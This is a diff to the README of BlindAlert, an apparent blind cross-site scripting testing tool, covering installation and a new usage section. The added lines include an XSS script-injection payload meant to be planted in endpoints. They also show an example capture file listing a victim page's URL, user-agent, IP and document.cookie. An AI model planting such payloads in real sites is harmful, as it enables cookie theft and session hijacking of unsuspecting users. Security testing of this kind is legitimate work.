@@ -2,7 +2,7 @@
 
 ![BlindAlert](https://preview.ibb.co/jSdgDx/blind_Alert.png)
 
-Easy Blind Xss testing tool.
+Easy Blind Cross-site Scripting testing tool.
 
 ## Requirements
 
@@ -18,12 +18,28 @@ To install BlindAlert, simply clone the repo
 git clone https://github.com/mdhama/blindAlert.git
 ```
 
-To Run local server 
+To Run on local server 
 ```
 cd blindAlert
-php -S localhost:8082
+php -S localhost:80
 ```
 
-Now open http://localhost:8082 in your browser.
+Now open http://localhost in your browser.
 
 ## Uses
+
+- Create a JS payload and start blindly putting into endpoints :-) 
+`e.g. "><script src="http://localhost"></script>`
+- When it executes sucessfully, it creates an output file within the same project directory. 
+
+Example output file.txt: 
+
+```
+origin: http://example
+host: example
+url: http://example/user/posts
+referrer: http://example/user
+user-agent: <user-agent>
+cookies: <document.cookie>
+ip: <ip_addess>
+```
